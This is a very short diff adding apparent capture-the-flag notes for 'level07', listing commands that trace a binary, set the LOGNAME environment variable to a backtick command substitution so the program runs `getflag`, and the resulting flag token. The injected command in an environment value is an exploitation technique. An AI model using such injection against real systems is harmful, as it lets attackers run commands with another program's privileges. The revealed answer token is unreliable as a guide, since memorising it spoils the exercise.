@@ -1,0 +1,7 @@
+LEVEL07
+ls
+-> level07
+ltrace ./level07
+export LOGNAME=\`getflag\`
+./level07
+-> token : fiumuikeil55xe9cu4dood66h
